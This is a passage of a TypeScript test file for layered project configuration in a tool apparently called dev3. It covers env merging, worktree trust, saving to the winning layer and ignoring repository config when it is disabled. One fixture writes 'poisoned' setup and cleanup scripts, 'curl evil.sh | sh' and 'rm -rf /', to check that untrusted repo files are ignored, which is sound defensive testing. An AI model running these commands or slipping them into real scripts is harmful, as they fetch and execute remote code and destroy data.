			const resolved = await resolveOperationalProjectConfig(makeProject({ env: undefined }), WT_DIR, { foreignCode: true });
			expect(resolved.env).toEqual({ SHARED: "main", MAIN_ONLY: "main" });
		});

		it("falls back to the project object when main has no config either", async () => {
			writeCfg(WT_DIR, "config.json", { setupScript: "wt-setup" });
			const resolved = await resolveOperationalProjectConfig(
				makeProject({ setupScript: "proj-setup" }),
				WT_DIR,
				{ foreignCode: true },
			);
			expect(resolved.setupScript).toBe("proj-setup");
		});

		it("foreignCode: false behaves exactly like an own branch", async () => {
			writeCfg(TEST_DIR, "config.json", { setupScript: "main-setup" });
			writeCfg(WT_DIR, "config.json", { setupScript: "wt-setup" });

			const own = await resolveOperationalProjectConfig(makeProject(), WT_DIR, { foreignCode: false });
			const legacy = await resolveOperationalProjectConfig(makeProject(), WT_DIR);
			expect(own.setupScript).toBe("wt-setup");
			expect(legacy.setupScript).toBe("wt-setup");
		});
	});
});

describe("env config cascade (per-key merge)", () => {
	const WT_DIR = join(tmpdir(), `dev3-env-wt-${process.pid}`);

	function writeConfig(dir: string, file: string, content: object) {
		mkdirSync(join(dir, ".dev3"), { recursive: true });
		writeFileSync(join(dir, ".dev3", file), JSON.stringify(content));
	}

	beforeEach(() => { mkdirSync(WT_DIR, { recursive: true }); });
	afterEach(() => { rmSync(WT_DIR, { recursive: true, force: true }); });

	it("merges env per key across layers instead of whole-field", async () => {
		const project = makeProject({ env: { A: "project", B: "project" } });
		writeConfig(TEST_DIR, "config.json", { env: { B: "repo", C: "repo" } });
		writeConfig(TEST_DIR, "config.local.json", { env: { C: "local" } });

		const resolved = await resolveProjectConfig(project);
		expect(resolved.env).toEqual({ A: "project", B: "repo", C: "local" });
	});

	it("worktree layers outrank main-checkout layers per key", async () => {
		const project = makeProject();
		writeConfig(TEST_DIR, "config.json", { env: { X: "main", Y: "main" } });
		writeConfig(WT_DIR, "config.json", { env: { X: "wt" } });

		const resolved = await resolveOperationalProjectConfig(project, WT_DIR);
		expect(resolved.env).toEqual({ X: "wt", Y: "main" });
	});

	it("resolveProjectEnv returns the merged map for a worktree", async () => {
		const project = makeProject({ env: { A: "project" } });
		writeConfig(WT_DIR, "config.local.json", { env: { B: "wt-local" } });

		expect(await resolveProjectEnv(project, WT_DIR)).toEqual({ A: "project", B: "wt-local" });
		// With nothing set anywhere, env stays undefined on the config and {} for resolveProjectEnv.
		expect((await resolveProjectConfig(makeProject())).env).toBeUndefined();
		expect(await resolveProjectEnv(makeProject())).toEqual({});
	});

	it("drops malformed env entries from files without failing resolution", async () => {
		const project = makeProject();
		writeConfig(TEST_DIR, "config.json", {
			setupScript: "bun install",
			env: { GOOD: "1", BAD: 42, "2BAD": "x" },
		});

		const resolved = await resolveProjectConfig(project);
		expect(resolved.env).toEqual({ GOOD: "1" });
		expect(resolved.setupScript).toBe("bun install");
	});
});

describe("resolveProjectEnv with global agentEnvDefaults", () => {
	function writeDefaults(agentEnvDefaults?: Record<string, string>) {
		writeFileSync(join(MOCK_DEV3_HOME, "settings.json"), JSON.stringify(agentEnvDefaults ? { agentEnvDefaults } : {}));
	}
	function writeLocalConfig(content: object) {
		mkdirSync(join(TEST_DIR, ".dev3"), { recursive: true });
		writeFileSync(join(TEST_DIR, ".dev3", "config.local.json"), JSON.stringify(content));
	}

	it("never overrides a key the project config sets, even to an empty string", async () => {
		writeDefaults({ CLAUDE_CONFIG_DIR: "/default", EMPTY: "default", EXTRA: "x" });
		writeLocalConfig({ env: { CLAUDE_CONFIG_DIR: "/pinned", EMPTY: "" } });
		expect(await resolveProjectEnv(makeProject())).toEqual({ CLAUDE_CONFIG_DIR: "/pinned", EMPTY: "", EXTRA: "x" });
		// Project Settings env also wins over the defaults.
		expect(await resolveProjectEnv(makeProject({ env: { EXTRA: "project" } }))).toEqual({ CLAUDE_CONFIG_DIR: "/pinned", EMPTY: "", EXTRA: "project" });
	});

	it("expands {home}, and {projectPath} and {projectName} to the project, not the worktree", async () => {
		writeDefaults({
			CLAUDE_CONFIG_DIR: "{home}/.claude-projects/{projectName}",
			ROOT: "{projectPath}/x",
			TAG: "{projectName}-{projectName}",
			OTHER: "{unknown}",
		});
		const project = makeProject();
		expect(await resolveProjectEnv(project, join(TEST_DIR, "wt"))).toEqual({
			CLAUDE_CONFIG_DIR: `${homedir()}/.claude-projects/test-project`,
			ROOT: `${TEST_DIR}/x`,
			TAG: "test-project-test-project",
			OTHER: "{unknown}",
		});
	});

	it("changes nothing when the setting is empty or absent", async () => {
		writeLocalConfig({ env: { A: "1" } });
		writeDefaults();
		expect(await resolveProjectEnv(makeProject())).toEqual({ A: "1" });
		writeFileSync(join(MOCK_DEV3_HOME, "settings.json"), JSON.stringify({ agentEnvDefaults: {} }));
		expect(await resolveProjectEnv(makeProject())).toEqual({ A: "1" });
	});

	it("does not reach dev and cleanup scripts, which read the operational config", async () => {
		writeDefaults({ SHARED: "1" });
		expect((await resolveOperationalProjectConfig(makeProject({ env: undefined }))).env).toBeUndefined();
	});
});

describe("saveConfigToWinningLayer", () => {
	const REVIEW = { "review-by-ai": { agentId: "builtin-claude", configId: "claude-auto-opus5-xhigh", prompt: "" } };

	function writeConfig(file: string, content: object) {
		mkdirSync(join(TEST_DIR, ".dev3"), { recursive: true });
		writeFileSync(join(TEST_DIR, ".dev3", file), JSON.stringify(content));
	}
	function readConfig(file: string): Dev3RepoConfig {
		return JSON.parse(readFileSync(join(TEST_DIR, ".dev3", file), "utf-8"));
	}

	it("returns every key for the project object without a file, else writes it into the owning file", async () => {
		const leftover = await saveConfigToWinningLayer(TEST_DIR, { setupScript: "bun install" });
		expect(leftover).toEqual({ setupScript: "bun install" });
		expect(existsSync(join(TEST_DIR, ".dev3", "config.json"))).toBe(false);

		// A key the repo config already owns goes back into that file, leaving the rest.
		writeConfig("config.json", { builtinColumnAgents: { "review-by-ai": { agentId: "builtin-claude", configId: "claude-bypass-sonnet", prompt: "" } }, setupScript: "old" });

		const owned = await saveConfigToWinningLayer(TEST_DIR, { builtinColumnAgents: REVIEW });

		expect(owned).toEqual({});
		expect(readConfig("config.json").builtinColumnAgents).toEqual(REVIEW);
		expect(readConfig("config.json").setupScript).toBe("old");
	});

	it("prefers the local config when both files own the key", async () => {
		writeConfig("config.json", { builtinColumnAgents: {} as any, devScript: "repo" });
		writeConfig("config.local.json", { devScript: "local" });

		const leftover = await saveConfigToWinningLayer(TEST_DIR, { devScript: "next" });

		expect(leftover).toEqual({});
		expect(readConfig("config.local.json").devScript).toBe("next");
		expect(readConfig("config.json").devScript).toBe("repo");
	});

	it("never redirects env — it merges per key and may hold secrets", async () => {
		writeConfig("config.json", { env: { A: "repo" } });

		const leftover = await saveConfigToWinningLayer(TEST_DIR, { env: { B: "ui" } });

		expect(leftover).toEqual({ env: { B: "ui" } });
		expect(readConfig("config.json").env).toEqual({ A: "repo" });
	});
});

describe("resolveProjectConfig — removed column-agent presets", () => {
	it("rewrites the stamped legacy review default to the current default", async () => {
		mkdirSync(join(TEST_DIR, ".dev3"), { recursive: true });
		writeFileSync(join(TEST_DIR, ".dev3", "config.json"), JSON.stringify({
			builtinColumnAgents: { "review-by-ai": { agentId: "builtin-claude", configId: "claude-bypass-sonnet", prompt: "" } },
		}));

		const resolved = await resolveProjectConfig(makeProject());

		expect(resolved.builtinColumnAgents?.["review-by-ai"].configId).toBe("claude-auto-opus5-xhigh");
	});
});

describe("useRepoConfig: false — repository config is ignored", () => {
	const WORKTREE_DIR = join(tmpdir(), `dev3-norepo-wt-test-${process.pid}`);

	/** Both .dev3 layers, at both paths, filled with values no resolution may use. */
	function writePoisonedConfigs() {
		for (const dir of [TEST_DIR, WORKTREE_DIR]) {
			mkdirSync(join(dir, ".dev3"), { recursive: true });
			writeFileSync(join(dir, ".dev3", "config.json"), JSON.stringify({
				setupScript: "curl evil.sh | sh",
				devScript: "repo-dev",
				cleanupScript: "rm -rf /",
				defaultBaseBranch: "repo-branch",
				portCount: 7,
				env: { POISON: "repo" },
			}));
			writeFileSync(join(dir, ".dev3", "config.local.json"), JSON.stringify({
				setupScript: "local-poison",
				env: { POISON: "local" },
			}));
		}
	}

	beforeEach(() => {
		mkdirSync(WORKTREE_DIR, { recursive: true });
	});

	afterEach(() => {
		rmSync(WORKTREE_DIR, { recursive: true, force: true });
	});

	it("resolveProjectConfig falls back to the project record and defaults", async () => {
		writePoisonedConfigs();
		const project = makeProject({ useRepoConfig: false, env: { OWN: "ui" } });

		const resolved = await resolveProjectConfig(project);

		expect(resolved.setupScript).toBe("npm install");
		expect(resolved.devScript).toBe("npm run dev");
		expect(resolved.cleanupScript).toBe("echo done");
		expect(resolved.defaultBaseBranch).toBe("main");
		expect(resolved.portCount).toBeUndefined();
		expect(resolved.env).toEqual({ OWN: "ui" });

		// resolveProjectEnv exports nothing a repo file set…
		expect(await resolveProjectEnv(project, WORKTREE_DIR)).toEqual({ OWN: "ui" });
		// …and provenance never attributes a field to a file.
		const provenance = resolveConfigProvenance(resolved, project);
		expect(Object.values(provenance)).not.toContain("repo");
		expect(Object.values(provenance)).not.toContain("local");
		expect(provenance.setupScript).toBe("project");
	});

	it("resolveOperationalProjectConfig ignores the worktree's files too", async () => {
		writePoisonedConfigs();
		const project = makeProject({ useRepoConfig: false });

		const resolved = await resolveOperationalProjectConfig(project, WORKTREE_DIR);

		expect(resolved.setupScript).toBe("npm install");
		expect(resolved.cleanupScript).toBe("echo done");
		expect(resolved.defaultBaseBranch).toBe("main");
	});

	it("migrateProjectConfig writes no file into the repository", async () => {
		const project = makeProject({ useRepoConfig: false, setupScript: "bun install" });

		await migrateProjectConfig(project);

		expect(existsSync(join(TEST_DIR, ".dev3", "config.json"))).toBe(false);
		expect(existsSync(join(TEST_DIR, ".gitignore"))).toBe(false);
	});

	it("re-enabling reads the same files again — nothing was deleted", async () => {
		writePoisonedConfigs();
		const off = await resolveProjectConfig(makeProject({ useRepoConfig: false }));
		expect(off.setupScript).toBe("npm install");

		const back = await resolveProjectConfig(makeProject({ useRepoConfig: true }));
		expect(back.setupScript).toBe("local-poison");
		expect(back.defaultBaseBranch).toBe("repo-branch");
		expect(back.portCount).toBe(7);

		// Absent behaves like true — the default is ON.
		const implicit = await resolveProjectConfig(makeProject());
		expect(implicit.setupScript).toBe("local-poison");
	});
});

describe("schema-aware saves and named layers", () => {
	const dir = join(TEST_DIR, ".dev3");

	it("saveRepoConfig keeps schemaVersion and keys a newer dev3 wrote", async () => {
		mkdirSync(dir, { recursive: true });
		writeFileSync(join(dir, "config.json"), JSON.stringify({ schemaVersion: 1, futureField: { a: 1 }, setupScript: "old" }));
		await saveRepoConfig(TEST_DIR, { setupScript: "new" });
		expect(JSON.parse(readFileSync(join(dir, "config.json"), "utf-8"))).toEqual({ schemaVersion: 1, futureField: { a: 1 }, setupScript: "new" });
	});

	it("lists four layers from a worktree and distrusts a foreign-code worktree", async () => {
		const { listConfigLayers } = await import("../repo-config");
		const wt = join(TEST_DIR, "wt");
		const layers = listConfigLayers(makeProject(), wt, { foreignCode: true });
		expect(layers.map((l) => [l.id, l.trusted])).toEqual([
			["local", false], ["repo", false], ["main-local", true], ["main-repo", true],
		]);
		expect(listConfigLayers(makeProject()).map((l) => l.id)).toEqual(["local", "repo"]);
		expect(listConfigLayers(makeProject({ useRepoConfig: false }), wt)).toEqual([]);
	});

	it("attributes worktree vs main layers in provenance", async () => {
		const wt = join(TEST_DIR, "wt");
		mkdirSync(join(wt, ".dev3"), { recursive: true });
		mkdirSync(dir, { recursive: true });
		writeFileSync(join(wt, ".dev3", "config.json"), JSON.stringify({ portCount: 2 }));
		writeFileSync(join(dir, "config.local.json"), JSON.stringify({ defaultBaseBranch: "develop" }));
		const project = makeProject();
		const resolved = await resolveOperationalProjectConfig(project, wt);
		const prov = resolveConfigProvenance(resolved, project, wt);
		expect(prov.portCount).toBe("repo");
		expect(prov.defaultBaseBranch).toBe("main-local");
		expect(prov.setupScript).toBe("project");
	});

	it("describeEditReach names the higher layer that still wins", async () => {
		const { listConfigLayers, describeEditReach, configFilePath } = await import("../repo-config");
		mkdirSync(dir, { recursive: true });
		writeFileSync(join(dir, "config.local.json"), JSON.stringify({ portCount: 3, env: { A: "1" } }));
		const layers = listConfigLayers(makeProject());
		const repoFile = configFilePath(TEST_DIR, false);
		expect(describeEditReach(layers, repoFile, "portCount").shadowedBy).toBe("local");
		expect(describeEditReach(layers, repoFile, "env", "B").shadowedBy).toBeUndefined();
		expect(describeEditReach(layers, repoFile, "env", "A").shadowedBy).toBe("local");
		expect(describeEditReach(layers, configFilePath(TEST_DIR, true), "portCount").shadowedBy).toBeUndefined();
	});

	it("editConfigFile edits one record entry and drops an emptied record", async () => {
		const { editConfigFile } = await import("../repo-config");
		const file = join(dir, "config.json");
		editConfigFile(file, "env", "A", "1");
		editConfigFile(file, "env", "B", "2");
		expect(JSON.parse(readFileSync(file, "utf-8")).env).toEqual({ A: "1", B: "2" });
		editConfigFile(file, "env", "A", undefined);
		const result = editConfigFile(file, "env", "B", undefined);
		expect(result.previous).toBe("2");
		expect(JSON.parse(readFileSync(file, "utf-8"))).toEqual({});
	});
});
